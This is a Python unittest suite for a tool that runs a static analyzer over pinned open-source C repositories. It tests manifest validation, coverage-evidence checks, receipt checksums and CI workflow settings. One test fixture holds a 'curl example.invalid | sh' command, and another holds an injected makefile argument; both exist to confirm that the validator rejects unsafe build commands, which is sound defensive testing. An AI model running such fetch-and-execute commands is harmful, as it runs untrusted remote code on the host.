#!/usr/bin/env python3
"""Contracts for the deterministic real-repository campaign factory."""

from __future__ import annotations

import copy
import importlib.util
import json
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
RUNNER = ROOT / "scripts" / "run_realworld_campaign.py"
MANIFEST = ROOT / "scripts" / "realworld_manifest.json"

spec = importlib.util.spec_from_file_location("realworld_campaign", RUNNER)
if spec is None or spec.loader is None:
    raise RuntimeError(f"cannot load campaign runner: {RUNNER}")
campaign = importlib.util.module_from_spec(spec)
spec.loader.exec_module(campaign)


def fixture_manifest() -> dict:
    fingerprints = ["csf1-0000000000000001"]
    return {
        "schema": 1,
        "campaigns": {
            "nightly": {
                "window_minutes": 720,
                "repetitions": 3,
                "projects": ["alpha"],
            }
        },
        "projects": [
            {
                "id": "alpha",
                "label": "fixture",
                "repository": "https://github.com/example/alpha.git",
                "revision": "1" * 40,
                "timeout_minutes": 20,
                "memory_mb": 4096,
                "commands": {
                    "configure": [
                        [
                            "cmake",
                            "-S",
                            "{source}",
                            "-B",
                            "{build}",
                            "-DCMAKE_EXPORT_COMPILE_COMMANDS=ON",
                        ]
                    ],
                    "build": [["cmake", "--build", "{build}"]],
                },
                "copies": [],
                "compile_database": "{build}/compile_commands.json",
                "sources": {
                    "roots": ["src"],
                    "extensions": [".c"],
                    "fallback_globs": [],
                },
                "analyzer_args": ["--report-paths", "{source}/src"],
                "expected": {
                    "translation_units": 2,
                    "translation_unit_sha256": "a" * 64,
                    "attempted_tus": 2,
                    "analyzed_tus": 2,
                    "broken_tus": 0,
                    "incomplete_functions": 0,
                    "findings": 1,
                    "exit_code": 1,
                    "fingerprint_sha256": campaign.fingerprint_digest(fingerprints),
                },
            }
        ],
    }


def source_coverage_report(paths, root, command_counts, whole_program=False):
    """Synthetic v1 report, not real execution or hosted qualification."""
    sources = [{"file": f"{root}/{path}", "status": "analyzed", "reason": "analyzed",
                "commands": commands, "analyzed_commands": commands,
                "skipped_commands": 0, "failed_commands": 0, "recovery_commands": 0,
                "prepass": {"status": "analyzed" if whole_program else "not_requested",
                            "reason": "analyzed" if whole_program else "",
                            "recovery_commands": 0}}
               for path, commands in zip(paths, command_counts)]
    return {"complete": True, "exit_code": 1, "total": 1,
            "diagnostics": [{"fingerprint": "csf1-0000000000000001"}],
            "coverage": {"schema": "codeskeptic-source-coverage/v1",
                         "attempted_tus": len(paths), "analyzed_tus": len(paths),
                         "broken_tus": 0, "skipped_tus": 0, "failed_tus": 0,
                         "recovery_tus": 0, "incomplete_functions": 0,
                         "attempted_commands": sum(command_counts),
                         "analyzed_commands": sum(command_counts),
                         "skipped_commands": 0, "failed_commands": 0,
                         "complete": True, "accept_partial_coverage": False,
                         "analyze_broken_tus": False, "sources": sources}}


def accepted_receipt(
    manifest: dict,
    repetition: int,
    project_index: int = 0,
    analyzer_sha: str = "b" * 64,
) -> dict:
    project = manifest["projects"][project_index]
    expected = project["expected"]
    identity = campaign.receipt_identity(
        manifest, project, repetition, analyzer_sha, expected["translation_unit_sha256"]
    )
    return {
        "schema": 1,
        "status": "accepted",
        "project": project["id"],
        "repetition": repetition,
        "identity": identity,
        "semantic": {
            "translation_units": {
                "count": expected["translation_units"],
                "sha256": expected["translation_unit_sha256"],
            },
            "coverage": {
                "attempted_tus": expected["attempted_tus"],
                "analyzed_tus": expected["analyzed_tus"],
                "broken_tus": expected["broken_tus"],
                "incomplete_functions": expected["incomplete_functions"],
            },
            "findings": expected["findings"],
            "exit_code": expected["exit_code"],
            "fingerprints": ["csf1-0000000000000001"],
            "fingerprint_sha256": expected["fingerprint_sha256"],
        },
        "execution": {"duration_seconds": 1.25, "resumed": False},
        "failures": [],
    }


class ManifestContractTest(unittest.TestCase):
    def test_canonical_manifest_is_exact_nightly_and_weekend_factory(self) -> None:
        manifest = campaign.load_manifest(MANIFEST)
        normalized = campaign.validate_manifest(manifest)
        self.assertEqual(
            {project["id"] for project in normalized["projects"]},
            {
                "libgit2",
                "rtp2httpd",
                "abseil",
                "libarchive",
                "systemd",
                "curl",
                "redis",
                "lvgl",
            },
        )
        self.assertEqual(
            normalized["campaigns"]["nightly"]["projects"],
            ["libgit2", "rtp2httpd", "abseil", "libarchive"],
        )
        self.assertEqual(
            normalized["campaigns"]["weekend"]["projects"],
            ["systemd", "curl", "redis", "lvgl"],
        )
        self.assertEqual(normalized["campaigns"]["nightly"]["repetitions"], 3)
        self.assertLessEqual(normalized["campaigns"]["nightly"]["window_minutes"], 720)
        self.assertEqual(normalized["campaigns"]["weekend"]["repetitions"], 3)
        self.assertEqual(normalized["campaigns"]["weekend"]["window_minutes"], 2880)
        self.assertEqual(
            {
                project["id"]: (
                    project["revision"],
                    project["expected"]["translation_units"],
                    project["expected"]["translation_unit_sha256"],
                )
                for project in normalized["projects"]
                if project["id"] in {"systemd", "curl", "redis", "lvgl"}
            },
            {
                "systemd": (
                    "009adf6c0e435376c80fbc11675d581e0a94d350",
                    390,
                    "5a65361ff67a6bc1dca48d0da5aee60ead0f1a061084492684e2c1cb7313823c",
                ),
                "curl": (
                    "b1ef0e1a01c0bb6ee5367bd9c186a603bde3615a",
                    169,
                    "213f0c1cb75de379b16ade4d0ab7cc8e701ced13a51fc822060db1f95ec92a01",
                ),
                "redis": (
                    "a0a6f23d997b024689ba157916837f493a593a34",
                    103,
                    "289cde3a18f71ccdcf3fd3b317a232e57514c14690b8d67f8551af261bcff844",
                ),
                "lvgl": (
                    "7f07a129e8d77f4984fff8e623fd5be18ff42e74",
                    311,
                    "30a090f5cdffb81f3b2184b5cd537d4ac85fff23acf3cdccecdb9ec13af00e50",
                ),
            },
        )
        self.assertEqual(
            {
                project["id"]: (
                    project["expected"]["attempted_tus"],
                    project["expected"]["analyzed_tus"],
                    project["expected"]["broken_tus"],
                    project["expected"]["incomplete_functions"],
                    project["expected"]["findings"],
                    project["expected"]["exit_code"],
                    project["expected"]["fingerprint_sha256"],
                )
                for project in normalized["projects"]
                if project["id"] in {"systemd", "curl", "redis", "lvgl"}
            },
            {
                "systemd": (
                    390,
                    815,
                    0,
                    0,
                    0,
                    0,
                    "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
                ),
                "curl": (
                    169,
                    169,
                    0,
                    0,
                    59,
                    1,
                    "195b80888b1e4e788c67f4e6024f31e667767e50d66d3fc3d483e619b424f094",
                ),
                "redis": (
                    103,
                    206,
                    0,
                    0,
                    0,
                    0,
                    "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
                ),
                "lvgl": (
                    311,
                    311,
                    0,
                    0,
                    16,
                    1,
                    "687bfeaa19046230afd60e116bb0d2fe73361d8b931161e33029bd79988ae808",
                ),
            },
        )

    def test_mutable_revision_duplicate_and_unsafe_command_fail(self) -> None:
        manifest = fixture_manifest()
        manifest["projects"][0]["revision"] = "main"
        with self.assertRaisesRegex(campaign.ManifestError, "immutable 40-hex"):
            campaign.validate_manifest(manifest)

        manifest = fixture_manifest()
        manifest["projects"].append(copy.deepcopy(manifest["projects"][0]))
        with self.assertRaisesRegex(campaign.ManifestError, "duplicate project"):
            campaign.validate_manifest(manifest)

        manifest = fixture_manifest()
        manifest["projects"][0]["commands"]["configure"] = [
            ["bash", "-c", "curl example.invalid | sh"]
        ]
        with self.assertRaisesRegex(campaign.ManifestError, "command executable"):
            campaign.validate_manifest(manifest)

        manifest = fixture_manifest()
        manifest["projects"][0]["expected"]["fingerprint_sha256"] = "0" * 64
        with self.assertRaisesRegex(campaign.ManifestError, "placeholder SHA-256"):
            campaign.validate_manifest(manifest)

    def test_plan_is_project_by_repetition_and_bounded(self) -> None:
        manifest = campaign.validate_manifest(fixture_manifest())
        matrix = campaign.plan_matrix(manifest, "nightly")
        self.assertEqual(
            matrix,
            {
                "include": [
                    {"project": "alpha", "repetition": 1, "timeout_minutes": 20},
                    {"project": "alpha", "repetition": 2, "timeout_minutes": 20},
                    {"project": "alpha", "repetition": 3, "timeout_minutes": 20},
                ]
            },
        )
        self.assertTrue(all(item["timeout_minutes"] <= 330 for item in matrix["include"]))

    def test_weekend_window_is_between_36_and_48_hours(self) -> None:
        manifest = fixture_manifest()
        manifest["campaigns"]["weekend"] = {
            "window_minutes": 2159,
            "repetitions": 3,
            "projects": ["alpha"],
        }
        with self.assertRaisesRegex(campaign.ManifestError, "weekend campaign window"):
            campaign.validate_manifest(manifest)

        manifest["campaigns"]["weekend"]["window_minutes"] = 2881
        with self.assertRaisesRegex(campaign.ManifestError, "weekend campaign window"):
            campaign.validate_manifest(manifest)

        manifest["campaigns"]["weekend"]["window_minutes"] = 2880
        campaign.validate_manifest(manifest)

    def test_meson_and_bear_adapters_are_strictly_shaped(self) -> None:
        manifest = fixture_manifest()
        project = manifest["projects"][0]
        project["commands"] = {
            "configure": [
                [
                    "meson",
                    "setup",
                    "{build}",
                    "{source}",
                    "--buildtype=release",
                ]
            ],
            "build": [["meson", "compile", "-C", "{build}", "app:executable"]],
        }
        campaign.validate_manifest(manifest)

        project["commands"]["configure"] = [["meson", "introspect", "{build}"]]
        with self.assertRaisesRegex(campaign.ManifestError, "meson configure shape"):
            campaign.validate_manifest(manifest)

        project["commands"] = {
            "configure": [["meson", "setup", "{build}", "{source}"]],
            "build": [["meson", "compile", "-C", "{build}", "--clean"]],
        }
        with self.assertRaisesRegex(campaign.ManifestError, "meson build shape"):
            campaign.validate_manifest(manifest)

        manifest = fixture_manifest()
        project = manifest["projects"][0]
        project["commands"]["build"] = [
            [
                "bear",
                "--output",
                "{build}/compile_commands.json",
                "--",
                "make",
                "-C",
                "{source}",
                "-j{jobs}",
                "CC=clang-20",
                "MALLOC=libc",
            ]
        ]
        campaign.validate_manifest(manifest)

        project["commands"]["build"] = [
            [
                "bear",
                "--output",
                "{build}/compile_commands.json",
                "--",
                "make",
                "-f",
                "Injected.mk",
            ]
        ]
        with self.assertRaisesRegex(campaign.ManifestError, "bear build shape"):
            campaign.validate_manifest(manifest)


class SourceCoverageContractTest(unittest.TestCase):
    def setUp(self):
        self.relative = ["src/one.c", "src/two.c"]
        self.absolute = ["/fixture/alpha/" + path for path in self.relative]
        self.digest = campaign.translation_unit_digest(self.relative)
        self.project = fixture_manifest()["projects"][0]
        self.project["expected"].update(analyzed_tus=3, translation_unit_sha256=self.digest)
        self.report = source_coverage_report(self.relative, "/fixture/alpha", [2, 1])

    def normalize(self, report=None, **kwargs):
        args = {"absolute_sources": self.absolute, "relative_sources": self.relative}
        args.update(kwargs)
        return campaign.semantic_from_report(self.project, 1, self.report if report is None else report,
                                              2, self.digest, **args)

    def test_verified_commands_map_to_unchanged_legacy_pins(self):
        original = copy.deepcopy(self.report)
        normalized = self.normalize()
        self.assertEqual(normalized["coverage"], {"attempted_tus": 2, "analyzed_tus": 3,
                                                  "broken_tus": 0, "incomplete_functions": 0})
        self.assertEqual(self.report, original)
        self.report["coverage"]["sources"].reverse()
        self.assertEqual(self.normalize(), normalized)
        self.project["analyzer_args"].append("--whole-program")
        self.report = source_coverage_report(self.relative, "/fixture/alpha", [2, 1], True)
        self.assertEqual(self.normalize(), normalized)  # Never count the prepass again.

    def test_legacy_execution_pin_is_still_exact(self):
        self.report = source_coverage_report(self.relative, "/fixture/alpha", [1, 1])
        with self.assertRaisesRegex(campaign.EvidenceError, "expectation drift"):
            self.normalize()

    def test_modern_schema_fields_cannot_be_dropped_or_extended(self):
        for target in ("coverage", "source", "prepass"):
            template = self.report["coverage"]
            if target != "coverage":
                template = template["sources"][0]
            if target == "prepass":
                template = template["prepass"]
            for field in [*template, "unknown-extra"]:
                broken = copy.deepcopy(self.report)
                node = broken["coverage"]
                if target != "coverage":
                    node = node["sources"][0]
                if target == "prepass":
                    node = node["prepass"]
                if field == "unknown-extra":
                    node[field] = 0
                else:
                    del node[field]
                with self.subTest(target=target, field=field), self.assertRaises(campaign.EvidenceError):
                    self.normalize(broken)
        for schema in (None, True, 1, "codeskeptic-source-coverage/v2"):
            broken = copy.deepcopy(self.report)
            broken["coverage"]["schema"] = schema
            with self.subTest(schema=schema), self.assertRaises(campaign.EvidenceError):
                self.normalize(broken)

    def test_all_counters_reject_booleans_floats_and_negative_values(self):
        for target in ("coverage", "source", "prepass"):
            template = self.report["coverage"]
            if target != "coverage":
                template = template["sources"][0]
            if target == "prepass":
                template = template["prepass"]
            for field in [key for key, value in template.items() if type(value) is int]:
                for value in (False, 0.0, -1):
                    broken = copy.deepcopy(self.report)
                    node = broken["coverage"]
                    if target != "coverage":
                        node = node["sources"][0]
                    if target == "prepass":
                        node = node["prepass"]
                    node[field] = value
                    with self.subTest(target=target, field=field, value=value), self.assertRaises(campaign.EvidenceError):
                        self.normalize(broken)

    def test_aggregate_counters_cannot_contradict_rows(self):
        for field, value in self.report["coverage"].items():
            if type(value) is not int:
                continue
            broken = copy.deepcopy(self.report)
            broken["coverage"][field] += 1
            with self.subTest(field=field), self.assertRaises(campaign.EvidenceError):
                self.normalize(broken)

    def test_incomplete_recovered_or_zero_command_sources_are_not_accepted(self):
        mutations = [("status", "skipped"), ("status", "failed"), ("reason", "error_recovery_ast"),
                     ("commands", 0), ("commands", 3), ("analyzed_commands", 1),
                     ("skipped_commands", 1), ("failed_commands", 1), ("recovery_commands", 1),
                     ("prepass", {"status": "failed", "reason": "ast_not_produced", "recovery_commands": 0}),
                     ("prepass", {"status": "analyzed", "reason": "analyzed", "recovery_commands": 0})]
        for field, value in mutations:
            broken = copy.deepcopy(self.report)
            broken["coverage"]["sources"][0][field] = value
            with self.subTest(field=field, value=value), self.assertRaises(campaign.EvidenceError):
                self.normalize(broken)
        for field, values in (("complete", (False, 1)), ("accept_partial_coverage", (True, 0)),
                              ("analyze_broken_tus", (True, 0))):
            for value in values:
                broken = copy.deepcopy(self.report)
                broken["coverage"][field] = value
                with self.subTest(field=field, value=value), self.assertRaises(campaign.EvidenceError):
                    self.normalize(broken)
        self.project["analyzer_args"].append("--whole-program")
        with self.assertRaisesRegex(campaign.EvidenceError, "prepass"):
            self.normalize()  # A missing required prepass is not complete.

    def test_source_rows_must_match_every_requested_identity(self):
        for mutation in ("duplicate", "substitute", "missing", "extra", "nonobject", "not-list"):
            broken = copy.deepcopy(self.report)
            rows = broken["coverage"]["sources"]
            if mutation == "duplicate":
                rows[1]["file"] = rows[0]["file"]
            elif mutation == "substitute":
                rows[1]["file"] = "/other/source.c"
            elif mutation == "missing":
                rows.pop()
            elif mutation == "extra":
                rows.append(copy.deepcopy(rows[0]))
            elif mutation == "nonobject":
                rows[0] = None
            else:
                broken["coverage"]["sources"] = {}
            with self.subTest(mutation=mutation), self.assertRaises(campaign.EvidenceError):
                self.normalize(broken)

    def test_source_lists_are_bound_to_digest_and_common_lexical_root(self):
        cases = [{"absolute_sources": None}, {"relative_sources": None},
                 {"absolute_sources": self.absolute[:1]},
                 {"absolute_sources": [self.absolute[0]] * 2},
                 {"relative_sources": list(reversed(self.relative))},
                 {"relative_sources": [self.relative[0]] * 2},
                 {"relative_sources": ["src/one.c", "src/different.c"]},
                 {"relative_sources": ["../one.c", "src/two.c"]},
                 {"relative_sources": ["src/./one.c", "src/two.c"]},
                 {"relative_sources": ["src\\one.c", "src/two.c"]},
                 {"absolute_sources": ["/fixture/alpha/../alpha/src/one.c", self.absolute[1]]},
                 {"absolute_sources": ["/fixture//alpha/src/one.c", self.absolute[1]]},
                 {"absolute_sources": ["relative/src/one.c", self.absolute[1]]},
                 {"absolute_sources": [42, self.absolute[1]]}]
        for kwargs in cases:
            with self.subTest(kwargs=kwargs), self.assertRaises(campaign.EvidenceError):
                self.normalize(**kwargs)
        # Even mutually consistent rows and lists may not mix checkout roots.
        self.absolute[1] = "/different/checkout/src/two.c"
        self.report["coverage"]["sources"][1]["file"] = self.absolute[1]
        with self.assertRaisesRegex(campaign.EvidenceError, "one source root"):
            self.normalize()

    def test_report_loader_rejects_duplicate_keys_and_nonfinite_numbers(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "report.json"
            path.write_text(json.dumps(self.report), encoding="utf-8")
            self.assertEqual(campaign.load_analysis_report(path), self.report)
            for raw in ('{"coverage":{},"coverage":{}}', '{"sources":[{"commands":0,"commands":1}]}',
                        '{"count":NaN}', '{"count":Infinity}', '{"count":-Infinity}', '{bad'):
                path.write_text(raw, encoding="utf-8")
                with self.subTest(raw=raw), self.assertRaises(campaign.EvidenceError):
                    campaign.load_analysis_report(path)


class EvidenceContractTest(unittest.TestCase):
    def test_source_schema_cannot_be_accepted_without_source_list_binding(self):
        report = source_coverage_report(["src/one.c", "src/two.c"], "/fixture/alpha", [1, 1])
        with self.assertRaises(campaign.EvidenceError):
            campaign.semantic_from_report(fixture_manifest()["projects"][0], 1,
                                          report, 2, "a" * 64)

    def test_legacy_projection_cannot_hide_partial_source_evidence(self):
        report = source_coverage_report(["src/one.c", "src/two.c"], "/fixture/alpha", [1, 1])
        report["coverage"]["complete"] = False
        report["coverage"]["recovery_tus"] = 1
        report["coverage"]["sources"][0]["recovery_commands"] = 1
        with self.assertRaises(campaign.EvidenceError):
            campaign.semantic_from_report(fixture_manifest()["projects"][0], 1,
                                          report, 2, "a" * 64)

    def test_whole_program_coverage_pins_extra_analysis_executions(self) -> None:
        manifest = fixture_manifest()
        manifest["projects"][0]["expected"]["analyzed_tus"] = 3
        project = campaign.validate_manifest(manifest)["projects"][0]
        report = {
            "complete": True,
            "exit_code": 1,
            "total": 1,
            "coverage": {
                "attempted_tus": 2,
                "analyzed_tus": 3,
                "broken_tus": 0,
                "incomplete_functions": 0,
            },
            "diagnostics": [{"fingerprint": "csf1-0000000000000001"}],
        }

        semantic = campaign.semantic_from_report(project, 1, report, 2, "a" * 64)

        self.assertEqual(semantic["coverage"]["attempted_tus"], 2)
        self.assertEqual(semantic["coverage"]["analyzed_tus"], 3)

    def test_report_requires_complete_exact_coverage_and_verdict(self) -> None:
        project = fixture_manifest()["projects"][0]
        report = {
            "complete": True,
            "exit_code": 1,
            "total": 1,
            "coverage": {
                "attempted_tus": 2,
                "analyzed_tus": 2,
                "broken_tus": 0,
                "incomplete_functions": 0,
            },
            "diagnostics": [{"fingerprint": "csf1-0000000000000001"}],
        }
        semantic = campaign.semantic_from_report(project, 1, report, 2, "a" * 64)
        self.assertEqual(semantic["findings"], 1)

        with self.assertRaisesRegex(campaign.EvidenceError, "report root"):
            campaign.semantic_from_report(project, 1, [], 2, "a" * 64)

        for mutation, expected in (
            (("complete", False), "complete verdict"),
            (("exit_code", 2), "unavailable verdict"),
        ):
            broken = copy.deepcopy(report)
            broken[mutation[0]] = mutation[1]
            with self.assertRaisesRegex(campaign.EvidenceError, expected):
                campaign.semantic_from_report(project, broken["exit_code"], broken, 2, "a" * 64)

        broken = copy.deepcopy(report)
        broken["coverage"]["analyzed_tus"] = 1
        with self.assertRaisesRegex(campaign.EvidenceError, "exact TU coverage"):
            campaign.semantic_from_report(project, 1, broken, 2, "a" * 64)

    def test_receipt_checksum_and_checkpoint_identity_fail_closed(self) -> None:
        manifest = campaign.validate_manifest(fixture_manifest())
        receipt = accepted_receipt(manifest, 1)
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "receipt.json"
            campaign.write_receipt(path, receipt)
            loaded = campaign.load_verified_receipt(path)
            self.assertTrue(campaign.checkpoint_matches(loaded, receipt["identity"]))

            stale = copy.deepcopy(receipt["identity"])
            stale["analyzer_sha256"] = "c" * 64
            self.assertFalse(campaign.checkpoint_matches(loaded, stale))

            path.write_text(path.read_text(encoding="utf-8") + " ", encoding="utf-8")
            with self.assertRaisesRegex(campaign.EvidenceError, "checksum"):
                campaign.load_verified_receipt(path)

    def test_aggregate_requires_three_identical_accepted_repetitions(self) -> None:
        manifest = campaign.validate_manifest(fixture_manifest())
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for repetition in (1, 2, 3):
                campaign.write_receipt(
                    root / "alpha" / f"repeat-{repetition}" / "receipt.json",
                    accepted_receipt(manifest, repetition),
                )
            summary = campaign.aggregate_receipts(manifest, "nightly", root)
            self.assertEqual(summary["status"], "accepted")
            self.assertEqual(summary["projects"]["alpha"]["repetitions"], 3)

            missing = root / "alpha" / "repeat-3" / "receipt.json"
            missing.unlink()
            missing.with_suffix(".json.sha256").unlink()
            with self.assertRaisesRegex(campaign.EvidenceError, "missing repetition"):
                campaign.aggregate_receipts(manifest, "nightly", root)

            campaign.write_receipt(missing, accepted_receipt(manifest, 3))
            drift = accepted_receipt(manifest, 2)
            drift["semantic"]["fingerprints"] = ["csf1-0000000000000002"]
            campaign.write_receipt(
                root / "alpha" / "repeat-2" / "receipt.json", drift
            )
            with self.assertRaisesRegex(campaign.EvidenceError, "nondeterministic"):
                campaign.aggregate_receipts(manifest, "nightly", root)

    def test_aggregate_requires_one_analyzer_across_all_projects(self) -> None:
        raw = fixture_manifest()
        beta = copy.deepcopy(raw["projects"][0])
        beta["id"] = "beta"
        beta["repository"] = "https://github.com/example/beta.git"
        beta["revision"] = "2" * 40
        raw["projects"].append(beta)
        raw["campaigns"]["nightly"]["projects"].append("beta")
        manifest = campaign.validate_manifest(raw)

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for project_index, project in enumerate(manifest["projects"]):
                analyzer_sha = ("b" if project_index == 0 else "c") * 64
                for repetition in (1, 2, 3):
                    campaign.write_receipt(
                        root
                        / project["id"]
                        / f"repeat-{repetition}"
                        / "receipt.json",
                        accepted_receipt(
                            manifest,
                            repetition,
                            project_index=project_index,
                            analyzer_sha=analyzer_sha,
                        ),
                    )

            with self.assertRaisesRegex(campaign.EvidenceError, "campaign analyzer"):
                campaign.aggregate_receipts(manifest, "nightly", root)

    def test_aggregate_recomputes_semantic_fingerprint_evidence(self) -> None:
        manifest = campaign.validate_manifest(fixture_manifest())
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for repetition in (1, 2, 3):
                receipt = accepted_receipt(manifest, repetition)
                receipt["semantic"]["fingerprints"] = ["csf1-0000000000000002"]
                campaign.write_receipt(
                    root / "alpha" / f"repeat-{repetition}" / "receipt.json",
                    receipt,
                )

            with self.assertRaisesRegex(campaign.EvidenceError, "fingerprint evidence"):
                campaign.aggregate_receipts(manifest, "nightly", root)

    def test_aggregate_cli_writes_unavailable_receipt_on_failure(self) -> None:
        manifest = fixture_manifest()
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            manifest_path = root / "manifest.json"
            output = root / "aggregate" / "receipt.json"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            code = campaign.main(
                [
                    "aggregate",
                    "--manifest",
                    str(manifest_path),
                    "--tier",
                    "nightly",
                    "--receipts",
                    str(root / "missing"),
                    "--output",
                    str(output),
                ]
            )
            self.assertEqual(code, 2)
            receipt = campaign.load_verified_receipt(output)
            self.assertEqual(receipt["status"], "unavailable")
            self.assertTrue(receipt["failures"])

    def test_run_cli_writes_unavailable_receipt_before_execution(self) -> None:
        manifest = fixture_manifest()
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            manifest_path = root / "manifest.json"
            output = root / "alpha" / "repeat-1" / "receipt.json"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            code = campaign.main(
                [
                    "run",
                    "--manifest",
                    str(manifest_path),
                    "--project",
                    "alpha",
                    "--repetition",
                    "1",
                    "--analyzer",
                    str(root / "missing-analyzer"),
                    "--workspace",
                    str(root / "work"),
                    "--output",
                    str(output),
                    "--repository-root",
                    str(ROOT),
                ]
            )
            self.assertEqual(code, 2)
            receipt = campaign.load_verified_receipt(output)
            self.assertEqual(receipt["status"], "unavailable")
            self.assertEqual(receipt["project"], "alpha")
            self.assertEqual(receipt["repetition"], 1)
            self.assertTrue(receipt["failures"])


class WorkflowContractTest(unittest.TestCase):
    def test_workflows_encode_fast_pr_and_sharded_nightly_boundaries(self) -> None:
        ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
        juliet = (ROOT / ".github" / "workflows" / "juliet.yml").read_text(encoding="utf-8")
        realworld = (ROOT / ".github" / "workflows" / "realworld.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("timeout-minutes: 30", ci)
        self.assertIn("timeout-minutes: 30", juliet)
        self.assertIn("workflow_dispatch:", realworld)
        self.assertIn("schedule:", realworld)
        self.assertIn('cron: "17 1 * * *"', realworld)
        self.assertIn("- weekend", realworld)
        self.assertIn('cron: "43 0 * * 0"', realworld)
        self.assertIn("github.event.schedule", realworld)
        for dependency in ("meson", "bear", "gperf", "libcap-dev", "libmount-dev"):
            self.assertIn(dependency, realworld)
        self.assertIn("fail-fast: false", realworld)
        self.assertIn("matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}", realworld)
        self.assertIn("timeout-minutes: 355", realworld)
        self.assertIn("if: always()", realworld)
        self.assertIn("run_realworld_campaign.py aggregate", realworld)
        self.assertNotIn("pull_request_target", realworld)
        self.assertNotIn("continue-on-error", realworld)


if __name__ == "__main__":
    unittest.main()
